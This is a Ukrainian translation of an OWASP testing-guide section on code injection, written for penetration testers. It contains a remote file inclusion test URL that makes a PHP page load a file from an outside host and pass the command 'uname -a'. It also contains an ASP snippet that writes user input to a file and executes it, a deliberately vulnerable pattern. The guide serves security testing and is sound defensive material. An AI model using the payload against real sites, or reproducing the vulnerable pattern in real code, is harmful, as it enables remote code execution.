# 4.7.11 Тестування ін'єкції коду (WSTG-INPV-11)

## Резюме
Цей розділ описує, як тестувальник може перевірити, чи можна ввести код як ввід на веб-сторінку і виконати його веб-сервером.

При тестуванні ін'єкції коду тестувальник подає ввід, який обробляється веб-сервером як динамічний код або як включений файл. Ці тести можуть спрямовуватись на різні серверні механізми сценаріїв, наприклад, ASP або PHP. Належна валідація вводу та безпечні практики кодування повинні використовуватися для захисту від цих атак.

## Цілі тестування
- Виявити точки ін'єкції, де можна ін'єктувати код в додаток.
- Оцінити серйозність ін'єкції.

## Як тестувати

### Тестування чорної скриньки

#### Тестування вразливостей ін'єкції PHP
Використовуючи рядок запиту, тестувальник може ін'єктувати код (у цьому прикладі шкідливий URL) для обробки як частини включеного файлу:

`https://www.example.com/uptime.php?pin=https://www.example2.com/packx1/cs.jpg?&cmd=uname%20-a`

> Шкідливий URL приймається як параметр для PHP-сторінки, який пізніше буде використаний у включеному файлі.

### Тестування сірої скриньки

#### Тестування вразливостей ін'єкції коду ASP
Дослідіть ASP-код на предмет користувацького вводу, який використовується у функціях виконання. Чи може користувач вводити команди в поле вводу даних? Тут ASP-код збереже ввід у файл, а потім виконає його:

```asp
<%
If not isEmpty(Request( "Data" ) ) Then
Dim fso, f
'Користувацький ввід Data записується у файл з назвою data.txt
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.OpenTextFile(Server.MapPath( "data.txt" ), 8, True)
f.Write Request("Data") & vbCrLf
f.close
Set f = nothing
Set fso = Nothing

'Data.txt виконується
Server.Execute( "data.txt" )

Else
%>

<form>
<input name="Data" /><input type="submit" name="Enter Data" />
</form>

<%
End If
%>
```

## Посилання
- Security Focus
- Insecure.org  
- Wikipedia
- OWASP Wiki про OS Injection